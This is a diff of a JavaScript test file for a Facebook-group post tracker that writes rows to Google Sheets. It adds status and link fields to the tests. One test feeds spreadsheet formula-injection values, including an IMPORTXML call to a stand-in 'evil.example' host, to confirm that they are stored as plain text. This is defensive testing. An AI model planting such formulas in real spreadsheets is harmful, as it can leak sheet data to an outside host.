@@ -35,7 +35,14 @@ describe('logPost replies with the row it wrote', () => {
     const w = createWorld({ now: '2026-03-09 16:45' });
     const app = w.app('jan');
 
-    const saved = await app.tracker.logPost({ propertyId: CASA.id, propertyName: CASA.name, fbAccount: 'APG Main' });
+    // A group post awaiting the group admin's approval: Pending, with its link (CONTRACT-v3).
+    const saved = await app.tracker.logPost({
+      propertyId: CASA.id,
+      propertyName: CASA.name,
+      fbAccount: 'APG Main',
+      postLink: LINK,
+      status: 'Pending',
+    });
 
     expect(saved).toMatchObject({ date: '2026-03-09', time: '16:45', status: 'Pending', postedBy: 'Jan Dela Cruz' });
     expect(await app.tracker.posts()).toEqual([saved]);
@@ -57,15 +64,16 @@ describe('what is written is plain text (D7, bug 2)', () => {
 
   it('writes what the app sent exactly, even what Sheets would evaluate', () => {
     const w = createWorld();
+    w.team.writeText(['=Jan', '', 'Intern', 'key-formula', '', 'TRUE']);
     w.logPost('maria', CASA, {
       type: '=IMPORTXML("https://evil.example", "//a")',
-      postLink: '+63 917 123 4567',
+      postLink: 'https://www.facebook.com/groups/apg/posts/+639171234567/',
       postedBy: '=Jan',
     });
 
     expect(w.posts.row(2)).toEqual([
       '2026-03-09', 'Casa Amara', '=IMPORTXML("https://evil.example", "//a")', '10:00', 'Posted', 'APG Main',
-      '+63 917 123 4567', '=Jan', CASA.id, '',
+      'https://www.facebook.com/groups/apg/posts/+639171234567/', '=Jan', CASA.id, '',
     ]);
   });
 
@@ -78,7 +86,7 @@ describe('what is written is plain text (D7, bug 2)', () => {
 
   it('writes the link and the status addLink sets as text too', () => {
     const w = createWorld();
-    w.logPost('jan', CASA, { postLink: '' });
+    w.logPost('jan', CASA, { status: 'Pending' });
     expect(w.call('jan', 'addLink', { property: CASA.name, propertyId: CASA.id, postLink: '=HYPERLINK("x")' })).toMatchObject({
       ok: true,
     });
@@ -113,11 +121,11 @@ describe('columns are found by header in each tab', () => {
 
   it('at once when a column is moved in the tracker, so a write never lands in the wrong one', () => {
     const w = createWorld();
-    w.logPost('jan', CASA, { postLink: '' });
+    w.logPost('jan', CASA, { status: 'Pending' });
 
     // Someone swaps Title and Type in the header between two requests.
     w.posts.typeAt(1, 2, 'Type').typeAt(1, 3, 'Title');
-    w.call('jan', 'logPost', { property: TOWER.name, propertyId: TOWER.id, fbAccount: 'APG Main', postLink: '' });
+    w.call('jan', 'logPost', { property: TOWER.name, propertyId: TOWER.id, fbAccount: 'APG Main', postLink: LINK, status: 'Pending' });
 
     expect(w.posts.row(3).slice(0, 3)).toEqual(['2026-03-09', 'Group post', '1201']);
   });
